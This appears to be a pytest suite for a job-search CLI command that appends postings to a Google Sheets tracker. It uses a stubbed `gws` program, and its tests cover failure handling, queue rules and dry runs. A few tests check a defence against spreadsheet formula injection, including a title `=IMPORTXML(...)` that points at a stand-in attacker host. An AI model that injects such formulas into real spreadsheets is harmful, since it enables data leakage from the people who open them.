"""`jsa track` (issue #12; PRD 04 "Tracker write"; PRD 02 "Tracker queue"; PRD 06 env overrides; XC-4, XC-9, XC-10).

`gws` is replaced by a stub script reached through `JSA_GWS_BIN`; the database is the libSQL container
(and a `file:` database), and the profile is a temporary directory.
"""

import json
import stat
import sys
from datetime import date, datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest
from conftest import drop_all_tables, unique_url
from profile_helpers import (
    SEARCH_TOML,
    copy_example,
    write_config_toml,
    write_search_toml,
)

from jsa import cli, db, tracker
from jsa.naming import normalize_company

LONG_AGO = "2020-01-01T00:00:00.000Z"

# Logs each invocation's argv to $STUB_LOG; fails when the row's ID is listed in $STUB_FAIL_IDS
# (as exit 1, garbage output, or an append response reporting no updated row, per $STUB_FAIL_MODE).
STUB = """\
#!{python}
import json, os, sys

argv = sys.argv[1:]
with open(os.environ["STUB_LOG"], "a") as log:
    log.write(json.dumps(argv) + "\\n")
body = json.loads(argv[argv.index("--json") + 1])
posting_id = str(body["values"][0][0])
failing = os.environ.get("STUB_FAIL_IDS", "").split(",")
if posting_id in failing:
    mode = os.environ.get("STUB_FAIL_MODE", "exit")
    if mode == "exit":
        print("boom", file=sys.stderr)
        sys.exit(1)
    if mode == "garbage":
        print("this is not json")
        sys.exit(0)
    if mode == "no-rows":
        print(json.dumps({{"updates": {{"updatedRows": 0}}}}))
        sys.exit(0)
    if mode == "empty-object":
        print("{{}}")
        sys.exit(0)
print(json.dumps({{"updates": {{"updatedRows": 1}}}}))
"""


@pytest.fixture
def tdb(db_url):
    """A connection to a database holding no postings but the test's own."""
    drop_all_tables(db_url)
    connection = db.connect()
    yield connection
    connection.close()


@pytest.fixture
def gws(tmp_path, monkeypatch):
    """A profile with a tracker id, and a stub `gws` whose invocations are logged."""
    profile = copy_example(tmp_path / "profile")
    write_config_toml(profile, 'tracker_spreadsheet_id = "sheet-123"\n')
    monkeypatch.setenv("JSA_PROFILE_DIR", str(profile))
    stub = tmp_path / "stub-gws"
    stub.write_text(STUB.format(python=sys.executable), encoding="utf-8")
    stub.chmod(stub.stat().st_mode | stat.S_IEXEC)
    log = tmp_path / "gws.log"
    monkeypatch.setenv("JSA_GWS_BIN", str(stub))
    monkeypatch.setenv("STUB_LOG", str(log))
    monkeypatch.delenv("STUB_FAIL_IDS", raising=False)
    monkeypatch.delenv("STUB_FAIL_MODE", raising=False)
    return profile, log


def calls(log: Path) -> list[list[str]]:
    if not log.exists():
        return []
    return [json.loads(line) for line in log.read_text().splitlines()]


def appended_rows(log: Path) -> list[list]:
    rows = []
    for argv in calls(log):
        rows.append(json.loads(argv[argv.index("--json") + 1])["values"][0])
    return rows


def seed(
    conn,
    *,
    company="Acme Widgets, Inc.",
    title="Staff Engineer",
    url=None,
    decision="Apply",
    tracked=False,
    closed=False,
    date_posted=None,
):
    posting_id = db.insert_posting(
        conn,
        company=company,
        title=title,
        url=url or unique_url(),
        search_agent="claude",
        date_posted=date_posted,
    )
    conn.execute(
        "UPDATE postings SET decision = ?, decided_at = ?, added_to_tracker = ?, "
        "closed_at = ? WHERE id = ?",
        (
            decision,
            LONG_AGO if decision else None,
            int(tracked),
            LONG_AGO if closed else None,
            posting_id,
        ),
    )
    return posting_id


def tracked_flag(conn, posting_id) -> int:
    return conn.execute(
        "SELECT added_to_tracker FROM postings WHERE id = ?", (posting_id,)
    ).fetchone()[0]


def jsa_track(monkeypatch, capsys, *args):
    monkeypatch.setattr(sys, "argv", ["jsa", "track", *map(str, args)])
    code = 0
    try:
        cli.main()
    except SystemExit as exit_:
        code = exit_.code if isinstance(exit_.code, int) else 1
    captured = capsys.readouterr()
    return code, captured.out + captured.err


def params_of(argv: list[str]):
    """Every JSON object in a `gws` command line, merged, so a test is indifferent to which flag carries what."""
    merged = {}
    for item in argv:
        try:
            parsed = json.loads(item)
        except ValueError:
            continue
        if isinstance(parsed, dict):
            merged.update(parsed)
    return merged


# --- the row builder ----------------------------------------------------------


def test_the_row_is_columns_a_to_h_in_order_with_two_blank_cells():
    row = tracker.tracker_row(
        7,
        "Acme Widgets",
        "Staff Engineer",
        "https://example.com/jobs/7",
        "2026-09-30",
        date(2026, 10, 4),
    )
    assert row == [
        7,
        "Acme Widgets",
        "Staff Engineer",
        "https://example.com/jobs/7",
        "2026-09-30",
        "2026-10-04",
        "",
        "",
    ]


def test_a_missing_date_posted_is_a_blank_cell():
    row = tracker.tracker_row(
        1, "Acme", "Engineer", "https://example.com/1", None, date(2026, 10, 4)
    )
    assert len(row) == 8
    assert row[4] in ("", None)
    assert row[5] == "2026-10-04"
    assert row[6:] == ["", ""]


@pytest.mark.parametrize("lead", ["=", "+", "-", "@"])
@pytest.mark.parametrize("column", ["company", "title", "url"])
def test_text_that_starts_like_a_formula_is_written_as_literal_text(lead, column):
    text = f"{lead}HYPERLINK(1,2)"
    fields = {"company": "Acme", "title": "Engineer", "url": "https://example.com/1"}
    fields[column] = text
    row = tracker.tracker_row(
        1,
        fields["company"],
        fields["title"],
        fields["url"],
        None,
        date(2026, 10, 4),
    )
    cell = row[{"company": 1, "title": 2, "url": 3}[column]]
    assert cell != text
    assert cell.startswith("'")
    assert text in cell


def test_ordinary_text_is_written_unchanged():
    row = tracker.tracker_row(
        1,
        "Acme (US) + Co",
        "Engineer - Platform",
        "https://example.com/a=b",
        None,
        date(2026, 10, 4),
    )
    assert row[1:4] == [
        "Acme (US) + Co",
        "Engineer - Platform",
        "https://example.com/a=b",
    ]


def test_the_row_builder_does_no_io(monkeypatch):
    import socket
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("tracker_row performed I/O")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(socket, "socket", forbidden)
    monkeypatch.setattr(db, "connect", forbidden)
    monkeypatch.setattr("builtins.open", forbidden)
    row = tracker.tracker_row(
        1, "Acme", "Engineer", "https://example.com/1", None, date(2026, 10, 4)
    )
    assert row[0] == 1


# --- appending through gws ----------------------------------------------------


def test_one_gws_call_per_queued_posting_with_the_spec_d_options(
    tdb, gws, monkeypatch, capsys
):
    _, log = gws
    ids = [seed(tdb, title=f"Engineer {n}") for n in range(3)]
    code, output = jsa_track(monkeypatch, capsys)
    assert code == 0, output
    invoked = calls(log)
    assert len(invoked) == 3
    for argv in invoked:
        joined = " ".join(argv)
        assert "USER_ENTERED" in joined
        assert "OVERWRITE" in joined
        assert "INSERT_ROWS" not in joined
        assert "sheet-123" in joined
        assert "Applications" in joined
    assert [row[0] for row in appended_rows(log)] == ids


def test_the_append_names_the_applications_tab_and_the_configured_sheet(
    tdb, gws, monkeypatch, capsys
):
    _, log = gws
    seed(tdb)
    jsa_track(monkeypatch, capsys)
    [argv] = calls(log)
    merged = params_of(argv)
    assert merged["spreadsheetId"] == "sheet-123"
    assert merged["range"].startswith("Applications")
    assert merged["valueInputOption"] == "USER_ENTERED"
    assert merged["insertDataOption"] == "OVERWRITE"


def test_the_program_is_the_one_named_by_jsa_gws_bin(
    tdb, gws, monkeypatch, capsys, tmp_path
):
    """A second stub, reached only through the env var, is the one that runs."""
    _, log = gws
    other_log = tmp_path / "other.log"
    other = tmp_path / "other-gws"
    other.write_text(STUB.format(python=sys.executable), encoding="utf-8")
    other.chmod(other.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("JSA_GWS_BIN", str(other))
    monkeypatch.setenv("STUB_LOG", str(other_log))
    seed(tdb)
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert len(calls(other_log)) == 1
    assert calls(log) == []


def test_the_default_program_is_gws(tdb, gws, monkeypatch, capsys, tmp_path):
    """With JSA_GWS_BIN unset, a `gws` on PATH is what runs."""
    _, log = gws
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    stub = bin_dir / "gws"
    stub.write_text(STUB.format(python=sys.executable), encoding="utf-8")
    stub.chmod(stub.stat().st_mode | stat.S_IEXEC)
    monkeypatch.delenv("JSA_GWS_BIN")
    monkeypatch.setenv("PATH", f"{bin_dir}:/usr/bin:/bin")
    seed(tdb)
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert len(calls(log)) == 1


def test_the_appended_row_carries_the_postings_columns_a_to_h(
    tdb, gws, monkeypatch, capsys
):
    _, log = gws
    posting_id = seed(
        tdb,
        company="Acme Widgets, Inc.",
        title="Staff Engineer",
        url="https://job-boards.greenhouse.io/acme/jobs/555",
        date_posted="2026-09-30",
    )
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    [row] = appended_rows(log)
    assert len(row) == 8
    assert row[0] == posting_id
    assert row[1] == normalize_company("Acme Widgets, Inc.")
    assert row[2] == "Staff Engineer"
    assert row[3] == "https://job-boards.greenhouse.io/acme/jobs/555"
    assert row[4] == "2026-09-30"
    assert row[5]
    assert row[6:] == ["", ""]


@pytest.mark.parametrize(
    ("timezone", "other"), [("Pacific/Kiritimati", "Pacific/Pago_Pago")]
)
def test_date_added_is_today_in_the_profiles_timezone(
    tdb, gws, monkeypatch, capsys, timezone, other
):
    profile, log = gws
    write_search_toml(profile, SEARCH_TOML.replace("America/New_York", timezone))
    seed(tdb)
    before = datetime.now(ZoneInfo(timezone)).date()
    code, _ = jsa_track(monkeypatch, capsys)
    after = datetime.now(ZoneInfo(timezone)).date()
    assert code == 0
    [row] = appended_rows(log)
    assert row[5] in {before.isoformat(), after.isoformat()}
    # Kiritimati and Pago Pago are 25 hours apart, so the host's own zone can match at most one of them.
    other_today = datetime.now(ZoneInfo(other)).date().isoformat()
    assert row[5] != other_today


def test_date_added_ignores_the_hosts_tz_variable(tdb, gws, monkeypatch, capsys):
    profile, log = gws
    write_search_toml(
        profile, SEARCH_TOML.replace("America/New_York", "Pacific/Kiritimati")
    )
    monkeypatch.setenv("TZ", "Pacific/Pago_Pago")
    seed(tdb)
    before = datetime.now(ZoneInfo("Pacific/Kiritimati")).date()
    jsa_track(monkeypatch, capsys)
    after = datetime.now(ZoneInfo("Pacific/Kiritimati")).date()
    [row] = appended_rows(log)
    assert row[5] in {before.isoformat(), after.isoformat()}


def test_a_formula_like_title_reaches_gws_as_literal_text(
    tdb, gws, monkeypatch, capsys
):
    _, log = gws
    seed(tdb, title='=IMPORTXML("https://evil.example","//a")')
    jsa_track(monkeypatch, capsys)
    [row] = appended_rows(log)
    assert not str(row[2]).startswith("=")
    assert "IMPORTXML" in row[2]


# --- confirming the append, and failures -------------------------------------


def test_a_confirmed_append_marks_the_posting_tracked(tdb, gws, monkeypatch, capsys):
    posting_id = seed(tdb)
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert tracked_flag(tdb, posting_id) == 1


def test_a_second_run_appends_nothing(tdb, gws, monkeypatch, capsys):
    _, log = gws
    seed(tdb)
    jsa_track(monkeypatch, capsys)
    assert len(calls(log)) == 1
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert len(calls(log)) == 1


def test_an_empty_queue_succeeds_without_invoking_gws(tdb, gws, monkeypatch, capsys):
    _, log = gws
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert calls(log) == []


@pytest.mark.parametrize("mode", ["exit", "garbage", "no-rows", "empty-object"])
def test_an_ambiguous_append_leaves_the_posting_queued_flags_it_and_exits_non_zero(
    tdb, gws, monkeypatch, capsys, mode
):
    posting_id = seed(tdb)
    monkeypatch.setenv("STUB_FAIL_IDS", str(posting_id))
    monkeypatch.setenv("STUB_FAIL_MODE", mode)
    code, output = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert tracked_flag(tdb, posting_id) == 0
    assert str(posting_id) in output
    assert [row[0] for row in db.tracker_queue(tdb)] == [posting_id]


@pytest.mark.parametrize("mode", ["exit", "garbage", "no-rows", "empty-object"])
def test_a_failed_row_does_not_strand_the_rest(tdb, gws, monkeypatch, capsys, mode):
    _, log = gws
    first, second, third = (seed(tdb, title=f"Engineer {n}") for n in range(3))
    monkeypatch.setenv("STUB_FAIL_IDS", str(first))
    monkeypatch.setenv("STUB_FAIL_MODE", mode)
    code, output = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert len(calls(log)) == 3
    assert tracked_flag(tdb, first) == 0
    assert tracked_flag(tdb, second) == 1
    assert tracked_flag(tdb, third) == 1
    assert str(first) in output


def test_a_failure_in_the_middle_still_appends_the_later_postings(
    tdb, gws, monkeypatch, capsys
):
    first, second, third = (seed(tdb, title=f"Engineer {n}") for n in range(3))
    monkeypatch.setenv("STUB_FAIL_IDS", str(second))
    code, _ = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert [tracked_flag(tdb, i) for i in (first, second, third)] == [1, 0, 1]


def test_a_missing_gws_program_leaves_the_posting_queued_and_exits_non_zero(
    tdb, gws, monkeypatch, capsys, tmp_path
):
    posting_id = seed(tdb)
    monkeypatch.setenv("JSA_GWS_BIN", str(tmp_path / "does-not-exist"))
    code, _ = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert tracked_flag(tdb, posting_id) == 0


def test_a_failed_row_is_picked_up_by_the_next_run(tdb, gws, monkeypatch, capsys):
    _, log = gws
    posting_id = seed(tdb)
    monkeypatch.setenv("STUB_FAIL_IDS", str(posting_id))
    code, _ = jsa_track(monkeypatch, capsys)
    assert code != 0
    monkeypatch.delenv("STUB_FAIL_IDS")
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert tracked_flag(tdb, posting_id) == 1
    assert len(calls(log)) == 2


# --- the queue ----------------------------------------------------------------


def test_only_untracked_open_apply_postings_are_appended(tdb, gws, monkeypatch, capsys):
    _, log = gws
    wanted = seed(tdb, title="Wanted")
    seed(tdb, title="Skipped", decision="Skip")
    seed(tdb, title="Undecided", decision=None)
    seed(tdb, title="Tracked", tracked=True)
    seed(tdb, title="Closed", closed=True)
    code, _ = jsa_track(monkeypatch, capsys)
    assert code == 0
    assert [row[0] for row in appended_rows(log)] == [wanted]


def test_the_skipped_undecided_tracked_and_closed_stay_as_they_were(
    tdb, gws, monkeypatch, capsys
):
    skipped = seed(tdb, decision="Skip")
    undecided = seed(tdb, decision=None)
    closed = seed(tdb, closed=True)
    jsa_track(monkeypatch, capsys)
    assert [tracked_flag(tdb, i) for i in (skipped, undecided, closed)] == [0, 0, 0]


def test_id_appends_only_that_posting(tdb, gws, monkeypatch, capsys):
    _, log = gws
    seed(tdb, title="Other")
    target = seed(tdb, title="Target")
    code, _ = jsa_track(monkeypatch, capsys, "--id", target)
    assert code == 0
    assert [row[0] for row in appended_rows(log)] == [target]


def test_id_appends_a_closed_apply_posting(tdb, gws, monkeypatch, capsys):
    _, log = gws
    posting_id = seed(tdb, closed=True)
    code, _ = jsa_track(monkeypatch, capsys, "--id", posting_id)
    assert code == 0
    assert [row[0] for row in appended_rows(log)] == [posting_id]
    assert tracked_flag(tdb, posting_id) == 1


@pytest.mark.parametrize("decision", ["Skip", None])
def test_id_never_appends_a_non_apply_posting(tdb, gws, monkeypatch, capsys, decision):
    _, log = gws
    posting_id = seed(tdb, decision=decision)
    jsa_track(monkeypatch, capsys, "--id", posting_id)
    assert calls(log) == []
    assert tracked_flag(tdb, posting_id) == 0


def test_a_closed_non_apply_posting_is_not_appended_by_id_either(
    tdb, gws, monkeypatch, capsys
):
    _, log = gws
    posting_id = seed(tdb, decision="Skip", closed=True)
    jsa_track(monkeypatch, capsys, "--id", posting_id)
    assert calls(log) == []


@pytest.mark.parametrize("closed", [False, True])
def test_id_never_appends_an_already_tracked_posting(
    tdb, gws, monkeypatch, capsys, closed
):
    _, log = gws
    posting_id = seed(tdb, tracked=True, closed=closed)
    jsa_track(monkeypatch, capsys, "--id", posting_id)
    assert calls(log) == []


def test_id_for_an_unknown_posting_appends_nothing(tdb, gws, monkeypatch, capsys):
    _, log = gws
    seed(tdb)
    jsa_track(monkeypatch, capsys, "--id", 999999)
    assert calls(log) == []


def test_the_tracker_queue_is_apply_untracked_and_open(tdb):
    wanted = seed(tdb, title="Wanted")
    seed(tdb, decision="Skip")
    seed(tdb, decision=None)
    seed(tdb, tracked=True)
    seed(tdb, closed=True)
    assert [row[0] for row in db.tracker_queue(tdb)] == [wanted]


def test_mark_tracked_sets_the_flag(tdb):
    posting_id = seed(tdb)
    db.mark_tracked(tdb, posting_id)
    assert tracked_flag(tdb, posting_id) == 1
    assert db.tracker_queue(tdb) == []


def test_mark_tracked_survives_a_new_connection(tdb, db_url):
    """XC-8: a write on a connection that never commits is silently rolled back."""
    posting_id = seed(tdb)
    db.mark_tracked(tdb, posting_id)
    other = db.connect()
    try:
        assert tracked_flag(other, posting_id) == 1
    finally:
        other.close()


# --- --dry-run ----------------------------------------------------------------


def test_dry_run_shows_the_rows_and_invokes_nothing(tdb, gws, monkeypatch, capsys):
    _, log = gws
    posting_id = seed(tdb, title="Distinctive Title For Preview")
    code, output = jsa_track(monkeypatch, capsys, "--dry-run")
    assert code == 0
    assert "Distinctive Title For Preview" in output
    assert calls(log) == []
    assert tracked_flag(tdb, posting_id) == 0


def test_dry_run_lists_every_queued_posting(tdb, gws, monkeypatch, capsys):
    seed(tdb, title="First Preview Title")
    seed(tdb, title="Second Preview Title")
    seed(tdb, title="Skipped Preview Title", decision="Skip")
    _, output = jsa_track(monkeypatch, capsys, "--dry-run")
    assert "First Preview Title" in output
    assert "Second Preview Title" in output
    assert "Skipped Preview Title" not in output


def test_dry_run_with_id_previews_only_that_posting(tdb, gws, monkeypatch, capsys):
    _, log = gws
    seed(tdb, title="Not Previewed")
    target = seed(tdb, title="Previewed Only")
    code, output = jsa_track(monkeypatch, capsys, "--dry-run", "--id", target)
    assert code == 0
    assert "Previewed Only" in output
    assert "Not Previewed" not in output
    assert calls(log) == []


# --- tracker_spreadsheet_id ---------------------------------------------------


@pytest.mark.parametrize("state", ["missing", "empty"])
def test_a_missing_or_empty_sheet_id_fails_before_any_append_pointing_to_the_example(
    tdb, gws, monkeypatch, capsys, state
):
    profile, log = gws
    write_config_toml(
        profile, "" if state == "missing" else 'tracker_spreadsheet_id = ""\n'
    )
    seed(tdb)
    posting_id = seed(tdb, title="Second")
    code, output = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert "profile.example" in output
    assert "tracker_spreadsheet_id" in output
    assert calls(log) == []
    assert tracked_flag(tdb, posting_id) == 0


@pytest.mark.parametrize("state", ["missing", "empty"])
def test_the_sheet_id_requirement_applies_even_when_the_queue_is_empty(
    tdb, gws, monkeypatch, capsys, state
):
    profile, _ = gws
    write_config_toml(
        profile, "" if state == "missing" else 'tracker_spreadsheet_id = ""\n'
    )
    code, output = jsa_track(monkeypatch, capsys)
    assert code != 0
    assert "profile.example" in output


@pytest.mark.parametrize("state", ["missing", "empty"])
def test_a_missing_sheet_id_fails_a_dry_run_too(tdb, gws, monkeypatch, capsys, state):
    profile, _ = gws
    write_config_toml(
        profile, "" if state == "missing" else 'tracker_spreadsheet_id = ""\n'
    )
    seed(tdb)
    code, output = jsa_track(monkeypatch, capsys, "--dry-run")
    assert code != 0
    assert "profile.example" in output


# --- the CLI and environment documentation ------------------------------------


def test_track_is_a_jsa_command_with_id_and_dry_run(monkeypatch, capsys):
    monkeypatch.setattr(sys, "argv", ["jsa", "track", "--help"])
    with pytest.raises(SystemExit) as exit_:
        cli.main()
    assert exit_.value.code == 0
    help_text = capsys.readouterr().out
    assert "--id" in help_text
    assert "--dry-run" in help_text


def test_env_example_documents_jsa_gws_bin():
    from conftest import REPO_ROOT

    assert "JSA_GWS_BIN" in (REPO_ROOT / ".env.example").read_text(encoding="utf-8")
